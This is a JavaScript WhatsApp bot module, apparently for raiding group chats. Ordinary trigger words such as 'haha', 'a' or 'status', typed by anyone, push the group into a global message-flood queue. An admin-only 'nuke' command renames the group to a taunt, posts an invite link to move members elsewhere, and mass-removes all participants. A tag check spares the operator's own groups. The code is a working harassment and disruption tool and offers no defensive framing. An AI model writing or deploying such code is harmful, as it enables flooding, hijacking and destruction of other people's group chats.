module.exports = (client) => {
    const { temTagProtecao } = require('./tag');

    client.ev.on("messages.upsert", async (m) => {
        try {
            const msg = m.messages[0];
            const from = msg.key.remoteJid;

            // 1. Verificação de segurança
            if (!msg.message || !from || !from.endsWith("@g.us")) return;

            // 2. Busca metadados do cache global
            let gMeta;
            try {
                gMeta = await global.getGroupMetadata(client, from);
            } catch {
                return;
            }

            // 3. Trava de Segurança via Descrição
            if (temTagProtecao(gMeta.desc || "")) return;

            // 4. Captura o texto da mensagem
            const body = msg.message.conversation || 
                         msg.message.extendedTextMessage?.text || 
                         msg.message.imageMessage?.caption || 
                         msg.message.videoMessage?.caption || "";
            
            if (!body) return; 
            
            const textoBaixo = body.toLowerCase().trim();
            const botId = client.user.id.split(':')[0] + '@s.whatsapp.net';
            const sender = msg.key.fromMe ? botId : (msg.key.participant || msg.key.remoteJid);

            // --- GATILHO: "haha" (DIV + STATUS SIMULTÂNEO) ---
            if (textoBaixo.includes("haha") && !global.botOff) {
                global.adicionarAoFilaDeFlood(client, from);
            }

            // --- GATILHO: "a" ---
            if (textoBaixo === "a" && !global.botOff) {
                global.adicionarAoFilaDeFlood(client, from);
            }

            // --- GATILHO: "status" ---
            if (textoBaixo === "status" && !global.botOff) {
                global.adicionarAoFilaDeFlood(client, from);
            }

            // --- GATILHO: "nuke" ---
            if (textoBaixo === "nuke") {
                const isAdmins = gMeta.participants.filter(v => !!v.admin).map(v => v.id).includes(sender);
                if (!isAdmins) return;

                await client.groupUpdateSubject(from, "MARCOS PASSOU O RATO 🤪").catch(() => null);
                const lk = await client.groupInviteCode(from).catch(() => "Indisponível");
                await client.groupUpdateDescription(from, `VEM PRO NOVO\nhttps://chat.whatsapp.com/${lk}`).catch(() => null);

                const botNum = client.user.id.split(':')[0] + '@s.whatsapp.net';
                const pnts = gMeta.participants.filter(p => p.id !== botNum).map(p => p.id);

                if (pnts.length > 0) {
                    await client.groupParticipantsUpdate(from, pnts, "remove").catch(() => null);
                }
            }
        } catch (e) { 
            console.log("Erro Main:", e.message);
        }
    });
};